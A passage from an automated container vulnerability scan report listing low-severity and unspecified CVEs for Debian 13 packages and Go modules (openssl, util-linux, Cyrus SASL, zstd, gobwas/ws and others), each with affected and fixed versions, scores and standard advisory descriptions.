<a href="https://scout.docker.com/v/CVE-2010-0928?s=debian&n=openssl&ns=debian&t=deb&osn=debian&osv=13&vr=%3E%3D3.2.1-3"><img alt="low : CVE--2010--0928" src="https://img.shields.io/badge/CVE--2010--0928-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=3.2.1-3</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.541%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>39th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

OpenSSL 0.9.8i on the Gaisler Research LEON3 SoC on the Xilinx Virtex-II Pro FPGA uses a Fixed Width Exponentiation (FWE) algorithm for certain signature calculations, and does not verify the signature before providing it to a caller, which makes it easier for physically proximate attackers to determine the private key via a modified supply voltage for the microprocessor, related to a "fault-based attack."

---
http://www.eecs.umich.edu/~valeria/research/publications/DATE10RSA.pdf
https://github.com/openssl/openssl/discussions/24540
Fault injection based attacks are not within OpenSSLs threat model according
to the security policy: https://www.openssl.org/policies/general/security-policy.html

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>perl-base</strong> <code>5.40.1-6+deb13u1</code> (deb)</summary>

<small><code>pkg:deb/debian/perl-base@5.40.1-6%2Bdeb13u1?arch=amd64&distro=debian-13.8&upstream=perl</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2011-4116?s=debian&n=perl&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2011--4116" src="https://img.shields.io/badge/CVE--2011--4116-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.524%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>38th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

_is_safe in the File::Temp module for Perl does not properly handle symlinks.

---
- perl <unfixed> (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=776268)
http://thread.gmane.org/gmane.comp.security.oss.general/6174/focus=6177
https://github.com/Perl-Toolchain-Gang/File-Temp/issues/14

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>filippo.io/edwards25519</strong> <code>1.1.0</code> (golang)</summary>

<small><code>pkg:golang/filippo.io/edwards25519@1.1.0</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-26958?s=github&n=edwards25519&ns=filippo.io&t=golang&vr=%3C1.1.1"><img alt="low 1.7: CVE--2026--26958" src="https://img.shields.io/badge/CVE--2026--26958-lightgrey?label=low%201.7&labelColor=fce1a9"/></a> <i>Improper Initialization</i>

<table>
<tr><td>Affected range</td><td><code>&lt;1.1.1</code></td></tr>
<tr><td>Fixed version</td><td><code>1.1.1</code></td></tr>
<tr><td>CVSS Score</td><td><code>1.7</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:U</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.531%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>38th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

`(*Point).MultiScalarMult` failed to initialize its receiver.

If the method was called on an initialized point that is not the identity point, MultiScalarMult produced an incorrect result.

If the method was called on an uninitialized point, the behavior was undefined. In particular, if the receiver was the zero value, MultiScalarMult returned an invalid point that compared Equal to every point.

*Note that MultiScalarMult is a rarely used advanced API. For example, if you only depend on `filippo.io/edwards25519` via `github.com/go-sql-driver/mysql`, **you are not affected**. If you were notified of this issue despite not being affected, consider switching to a vulnerability scanner that is more precise and respectful of your attention, like [govulncheck](https://go.dev/doc/tutorial/govulncheck).*

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>bsdutils</strong> <code>1:2.41.5-0+deb13u1</code> (deb)</summary>

<small><code>pkg:deb/debian/bsdutils@1%3A2.41.5-0%2Bdeb13u1?arch=amd64&distro=debian-13.8&upstream=util-linux%402.41.5-0%2Bdeb13u1</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2022-0563?s=debian&n=util-linux&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2022--0563" src="https://img.shields.io/badge/CVE--2022--0563-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.400%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>26th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in the util-linux chfn and chsh utilities when compiled with Readline support. The Readline library uses an "INPUTRC" environment variable to get a path to the library config file. When the library cannot parse the specified file, it prints an error message containing data from the file. This flaw allows an unprivileged user to read root-owned files, potentially leading to privilege escalation. This flaw affects util-linux versions prior to 2.37.4.

---
- util-linux <unfixed> (unimportant)
https://bugzilla.redhat.com/show_bug.cgi?id=2053151
https://lore.kernel.org/util-linux/20220214110609.msiwlm457ngoic6w@<!-- -->ws.net.home/T/#u
https://github.com/util-linux/util-linux/commit/faa5a3a83ad0cb5e2c303edbfd8cd823c9d94c17
util-linux in Debian does build with readline support but chfn and chsh are provided
by src:shadow and util-linux is configured with --disable-chfn-chsh

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>libsasl2-2</strong> <code>2.1.28+dfsg1-9</code> (deb)</summary>

<small><code>pkg:deb/debian/libsasl2-2@2.1.28%2Bdfsg1-9?arch=amd64&distro=debian-13.8&upstream=cyrus-sasl2</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-129483?s=debian&n=cyrus-sasl2&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2026--129483" src="https://img.shields.io/badge/CVE--2026--129483-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.696%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>48th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Cyrus SASL through 2.1.28 contains an authentication bypass vulnerability in the SRP server mechanism because srp_server_mech_step2 does not reject client public values A that are multiples of N. Unauthenticated network clients can send A equal to N to force a zero shared secret, authenticating as any existing user without the password and learning session keys.

---
- cyrus-sasl2 <unfixed> (unimportant)
https://www.openwall.com/lists/oss-security/2026/10/09/20
https://github.com/cyrusimap/cyrus-sasl/issues/896
https://gist.github.com/afldl/18d15d3f5a1df99411e35000c7de80db
Fixed by: https://github.com/cyrusimap/cyrus-sasl/commit/fb3724f43dc50247ff2bf02135457d6d77031654
cyrus-sasl2 in Debian builds with --disable-srp

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>libapt-pkg7.0</strong> <code>3.0.4</code> (deb)</summary>

<small><code>pkg:deb/debian/libapt-pkg7.0@3.0.4?arch=amd64&distro=debian-13.8&upstream=apt</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2011-3374?s=debian&n=apt&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2011--3374" src="https://img.shields.io/badge/CVE--2011--3374-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>1.191%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>68th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

It was found that apt-key in apt, all versions, do not correctly validate gpg keys with the master keyring, leading to a potential man-in-the-middle attack.

---
- apt <unfixed> (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=642480)
Not exploitable in Debian, since no keyring URI is defined

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>liblastlog2-2</strong> <code>2.41.5-0+deb13u1</code> (deb)</summary>

<small><code>pkg:deb/debian/liblastlog2-2@2.41.5-0%2Bdeb13u1?arch=amd64&distro=debian-13.8&upstream=util-linux</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2022-0563?s=debian&n=util-linux&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2022--0563" src="https://img.shields.io/badge/CVE--2022--0563-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.400%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>26th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in the util-linux chfn and chsh utilities when compiled with Readline support. The Readline library uses an "INPUTRC" environment variable to get a path to the library config file. When the library cannot parse the specified file, it prints an error message containing data from the file. This flaw allows an unprivileged user to read root-owned files, potentially leading to privilege escalation. This flaw affects util-linux versions prior to 2.37.4.

---
- util-linux <unfixed> (unimportant)
https://bugzilla.redhat.com/show_bug.cgi?id=2053151
https://lore.kernel.org/util-linux/20220214110609.msiwlm457ngoic6w@<!-- -->ws.net.home/T/#u
https://github.com/util-linux/util-linux/commit/faa5a3a83ad0cb5e2c303edbfd8cd823c9d94c17
util-linux in Debian does build with readline support but chfn and chsh are provided
by src:shadow and util-linux is configured with --disable-chfn-chsh

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>libmount1</strong> <code>2.41.5-0+deb13u1</code> (deb)</summary>

<small><code>pkg:deb/debian/libmount1@2.41.5-0%2Bdeb13u1?arch=amd64&distro=debian-13.8&upstream=util-linux</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2022-0563?s=debian&n=util-linux&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2022--0563" src="https://img.shields.io/badge/CVE--2022--0563-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.400%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>26th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in the util-linux chfn and chsh utilities when compiled with Readline support. The Readline library uses an "INPUTRC" environment variable to get a path to the library config file. When the library cannot parse the specified file, it prints an error message containing data from the file. This flaw allows an unprivileged user to read root-owned files, potentially leading to privilege escalation. This flaw affects util-linux versions prior to 2.37.4.

---
- util-linux <unfixed> (unimportant)
https://bugzilla.redhat.com/show_bug.cgi?id=2053151
https://lore.kernel.org/util-linux/20220214110609.msiwlm457ngoic6w@<!-- -->ws.net.home/T/#u
https://github.com/util-linux/util-linux/commit/faa5a3a83ad0cb5e2c303edbfd8cd823c9d94c17
util-linux in Debian does build with readline support but chfn and chsh are provided
by src:shadow and util-linux is configured with --disable-chfn-chsh

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>openssl</strong> <code>3.5.9-1~deb13u1</code> (deb)</summary>

<small><code>pkg:deb/debian/openssl@3.5.9-1~deb13u1?arch=amd64&distro=debian-13.8</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2010-0928?s=debian&n=openssl&ns=debian&t=deb&osn=debian&osv=13&vr=%3E%3D3.2.1-3"><img alt="low : CVE--2010--0928" src="https://img.shields.io/badge/CVE--2010--0928-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=3.2.1-3</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.541%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>39th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

OpenSSL 0.9.8i on the Gaisler Research LEON3 SoC on the Xilinx Virtex-II Pro FPGA uses a Fixed Width Exponentiation (FWE) algorithm for certain signature calculations, and does not verify the signature before providing it to a caller, which makes it easier for physically proximate attackers to determine the private key via a modified supply voltage for the microprocessor, related to a "fault-based attack."

---
http://www.eecs.umich.edu/~valeria/research/publications/DATE10RSA.pdf
https://github.com/openssl/openssl/discussions/24540
Fault injection based attacks are not within OpenSSLs threat model according
to the security policy: https://www.openssl.org/policies/general/security-policy.html

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>util-linux</strong> <code>2.41.5-0+deb13u1</code> (deb)</summary>

<small><code>pkg:deb/debian/util-linux@2.41.5-0%2Bdeb13u1?arch=amd64&distro=debian-13.8</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2022-0563?s=debian&n=util-linux&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2022--0563" src="https://img.shields.io/badge/CVE--2022--0563-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.400%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>26th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in the util-linux chfn and chsh utilities when compiled with Readline support. The Readline library uses an "INPUTRC" environment variable to get a path to the library config file. When the library cannot parse the specified file, it prints an error message containing data from the file. This flaw allows an unprivileged user to read root-owned files, potentially leading to privilege escalation. This flaw affects util-linux versions prior to 2.37.4.

---
- util-linux <unfixed> (unimportant)
https://bugzilla.redhat.com/show_bug.cgi?id=2053151
https://lore.kernel.org/util-linux/20220214110609.msiwlm457ngoic6w@<!-- -->ws.net.home/T/#u
https://github.com/util-linux/util-linux/commit/faa5a3a83ad0cb5e2c303edbfd8cd823c9d94c17
util-linux in Debian does build with readline support but chfn and chsh are provided
by src:shadow and util-linux is configured with --disable-chfn-chsh

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>mount</strong> <code>2.41.5-0+deb13u1</code> (deb)</summary>

<small><code>pkg:deb/debian/mount@2.41.5-0%2Bdeb13u1?arch=amd64&distro=debian-13.8&upstream=util-linux</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2022-0563?s=debian&n=util-linux&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2022--0563" src="https://img.shields.io/badge/CVE--2022--0563-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.400%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>26th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in the util-linux chfn and chsh utilities when compiled with Readline support. The Readline library uses an "INPUTRC" environment variable to get a path to the library config file. When the library cannot parse the specified file, it prints an error message containing data from the file. This flaw allows an unprivileged user to read root-owned files, potentially leading to privilege escalation. This flaw affects util-linux versions prior to 2.37.4.

---
- util-linux <unfixed> (unimportant)
https://bugzilla.redhat.com/show_bug.cgi?id=2053151
https://lore.kernel.org/util-linux/20220214110609.msiwlm457ngoic6w@<!-- -->ws.net.home/T/#u
https://github.com/util-linux/util-linux/commit/faa5a3a83ad0cb5e2c303edbfd8cd823c9d94c17
util-linux in Debian does build with readline support but chfn and chsh are provided
by src:shadow and util-linux is configured with --disable-chfn-chsh

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>libblkid1</strong> <code>2.41.5-0+deb13u1</code> (deb)</summary>

<small><code>pkg:deb/debian/libblkid1@2.41.5-0%2Bdeb13u1?arch=amd64&distro=debian-13.8&upstream=util-linux</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2022-0563?s=debian&n=util-linux&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2022--0563" src="https://img.shields.io/badge/CVE--2022--0563-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.400%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>26th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in the util-linux chfn and chsh utilities when compiled with Readline support. The Readline library uses an "INPUTRC" environment variable to get a path to the library config file. When the library cannot parse the specified file, it prints an error message containing data from the file. This flaw allows an unprivileged user to read root-owned files, potentially leading to privilege escalation. This flaw affects util-linux versions prior to 2.37.4.

---
- util-linux <unfixed> (unimportant)
https://bugzilla.redhat.com/show_bug.cgi?id=2053151
https://lore.kernel.org/util-linux/20220214110609.msiwlm457ngoic6w@<!-- -->ws.net.home/T/#u
https://github.com/util-linux/util-linux/commit/faa5a3a83ad0cb5e2c303edbfd8cd823c9d94c17
util-linux in Debian does build with readline support but chfn and chsh are provided
by src:shadow and util-linux is configured with --disable-chfn-chsh

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <img alt="unspecified: 1" src="https://img.shields.io/badge/U-1-lightgrey"/><strong>libzstd1</strong> <code>1.5.7+dfsg-1</code> (deb)</summary>

<small><code>pkg:deb/debian/libzstd1@1.5.7%2Bdfsg-1?arch=amd64&distro=debian-13.8&upstream=libzstd</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-124851?s=debian&n=libzstd&ns=debian&t=deb&osn=debian&osv=13&vr=%3C1.5.7%2Bdfsg-1%2Bdeb13u1"><img alt="unspecified : CVE--2026--124851" src="https://img.shields.io/badge/CVE--2026--124851-lightgrey?label=unspecified%20&labelColor=lightgrey"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;1.5.7+dfsg-1+deb13u1</code></td></tr>
<tr><td>Fixed version</td><td><code>1.5.7+dfsg-1+deb13u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.342%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>20th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An information disclosure vulnerability in Zstandard versions 1.5.1 through 1.5.7 allows specially crafted compressed data to expose the contents of an internal buffer through decompressed output. The buffer is 64 KiB in the default configuration and may contain uninitialized memory or literals from earlier decompressions performed using the same decompression context. An attacker who can submit compressed data and observe the resulting output can recover the buffer's contents.

---
- libzstd <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1155105)
https://www.facebook.com/security/advisories/cve-2026-124851
Fixed by: https://github.com/meta/zstd/commit/0c9d297531a9f15a717ff24604afc0843b3b1427 (v1.6.0)

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <img alt="unspecified: 1" src="https://img.shields.io/badge/U-1-lightgrey"/><strong>github.com/gobwas/ws</strong> <code>1.4.0</code> (golang)</summary>

<small><code>pkg:golang/github.com/gobwas/ws@1.4.0</code></small><br/>
<a href="https://scout.docker.com/v/GHSA-4xr6-hc3h-f6jq?s=golang&n=ws&ns=github.com%2Fgobwas&t=golang&vr=%3C1.5.0"><img alt="unspecified : GHSA--4xr6--hc3h--f6jq" src="https://img.shields.io/badge/GHSA--4xr6--hc3h--f6jq-lightgrey?label=unspecified%20&labelColor=lightgrey"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;1.5.0</code></td></tr>
<tr><td>Fixed version</td><td><code>1.5.0</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

ws.ReadFrame, ws.MustReadFrame, and the wsutil message readers allocate a buffer of the payload length declared in the frame header before reading any payload bytes. A remote unauthenticated peer can send a frame header declaring a large payload length and cause an out-of-memory crash.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <img alt="unspecified: 1" src="https://img.shields.io/badge/U-1-lightgrey"/><strong>golang.org/x/crypto</strong> <code>0.58.0</code> (golang)</summary>

<small><code>pkg:golang/golang.org/x/crypto@0.58.0</code></small><br/>
<a href="https://scout.docker.com/v/GO-2026-5932?s=golang&n=crypto&ns=golang.org%2Fx&t=golang&vr=%3C0.58.1-0.20261009181718-2f1f834330b2"><img alt="unspecified : GO--2026--5932" src="https://img.shields.io/badge/GO--2026--5932-lightgrey?label=unspecified%20&labelColor=lightgrey"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;0.58.1-0.20261009181718-2f1f834330b2</code></td></tr>
<tr><td>Fixed version</td><td><code>0.58.1-0.20261009181718-2f1f834330b2</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The golang.org/x/crypto/openpgp package is unsafe by design, has numerous known security issues, is not maintained, and should not be used.

If you are required to interoperate with OpenPGP systems and need a maintained package, consider github.com/ProtonMail/go-crypto/openpgp which is a maintained fork that aims to be a drop-in replacement for this package.

</blockquote>
</details>
</details></td></tr>
</table>

